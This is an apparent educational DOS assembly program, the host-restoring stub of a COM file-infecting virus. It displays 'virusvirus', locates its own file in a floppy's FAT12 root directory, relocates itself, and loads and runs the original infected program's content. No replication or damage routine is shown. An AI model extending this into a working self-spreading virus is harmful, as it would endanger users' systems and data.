org 100h
DispStr:
	mov	ax, Msg
	mov	bp, ax			; ES:BP = 串地址
	mov	cx, 10			; CX = 串长度
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮
	mov	dl, 8
	mov     dh, 3
	int	10h			; 10h 号中断
;;;;;;;;;;;;;
push path
push ds
call GetExeName
pop ds
add sp,2

call FindExeCluster

push ax

mov di, $$ + 0200h
mov si, MovedCode
mov cx, movedcount

call Memove
jmp $$ + 0200h; jmp to movedcode which copied to 100h + 200h

MovedCode:
xor ah, ah ; reset drive
xor dl, dl
int 13h

pop ax;get sector which is pushed after ResumeInfectedFile
mov cl, 1
mov bx, $$;将被感染程序的内容加载到100h，去执行之
call ReadSector
mov ax, $$
jmp ax; 跳到恢复的被感染文件内容去执行对com就是100h,不要直接用jmp $$因为这会用相对偏移，而代码搬迁后，这个偏移需要修订。

ReadSector:;该函数的绝对扇区号是从0开始的
;ax 绝对扇区号, cl 读取的扇区数量 , bx 缓存区
push bp
mov bp, sp
sub sp, 2
push bx
mov byte [bp - 2], cl
mov bl, 18
div bl
inc ah; sectorno
mov cl, ah; set sectorno
mov dh, al
and dh, 1; hdr
shr al, 1; trackno track在磁盘文件上是按同trackno的所有磁头的连续存放，因为软盘2磁头，所以除以2
mov ch, al;set track no 
mov dl, 0; drive 0
pop bx
mov ah, 02h; read
mov al, [bp - 2]; read [bp-2] sectors
int 13h
add sp, 2
pop bp
ret

movedcount equ $ - MovedCode



GetExeName:
push bp
mov bp,sp
mov ax,[2ch]
mov ds,ax
xor bx,bx
find_00:
mov ax,[bx]
inc bx
test ax,ax
jnz find_00
add bx,3;跳过剩下的一个0和下两个字节

;移动到文件最后一个字节
move_end:
mov al,byte [bx]
inc bx
test al,al
jnz move_end
sub bx,2;bx的偏移在文件的最后一个字节

;再移动回上一个'\'
find_xie:
mov al,byte[bx]
dec bx
test al,al
jz find_xie_end;如果不是绝对路径，则不可能找到分号
cmp al,'\'
jnz find_xie
find_xie_end:
add bx,2;此时bx就是文件名开始的偏移
mov si,[bp+6]
mov es,[bp+4];因为函数一开始压了bp所以栈要多出一个
copy_name:
mov al,[bx]
cmp al,'.';跳过文件名后缀的'.'不复制
jz Skip
test al,al
jz copy_name_end
mov [es:si],al
inc si
Skip:
inc bx
jmp copy_name
copy_name_end:
pop bp
ret


FindExeCluster:
push bp
mov bp,sp
sub sp,2;用于累加查找根目录项
sub sp,512;用于存放读取的扇区
mov ax,19;根目录位于第19扇区
mov cl,1
lea bx,[bp-512]
call ReadSector

mov al,1
mov [bp-512-2],al;[bp-512-2]+19为目前所对比的项的偏移
copypath:
mov al,[bp-512-2]
mov dx,32
mul dx
mov si,bx
add si,ax;dx存放目前要复制的项的偏移
mov di,pathcopy
copystart:
mov al,[si]
test al,al
jz compare
cmp al,' '
jz SkipCopy
mov [di],al
inc di
SkipCopy:
inc si
jmp copystart

compare:
mov [di],al;让字符串以00结尾
call strCmp
test ax,ax
jz notFind
mov ax,[bp-512-2]
mov dx,32
mul dx
lea bx,[bp-512]
mov si,bx
add si,ax
add si,20
mov ax,word [si]
add ax,31;转换为绝对扇区号
mov sp,bp
pop bp
ret
notFind:
add word [bp-512-2],1
jmp copypath


strCmp:
push bp
mov bp, sp
push si
push di
mov si, path
mov di, pathcopy
_loop_cmp:
mov al, [si]
cmp al, [di]
jz _cmp_matched
xor ax, ax
jmp _cmp_end
_cmp_matched:
inc si
inc di
test al, al
jnz _loop_cmp
mov ax, 1
_cmp_end:
pop di
pop si
pop bp
ret

Memove:

mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz Memove
ret


Msg db "virusvirus"
path times 16 db 0
pathcopy times 16 db 0

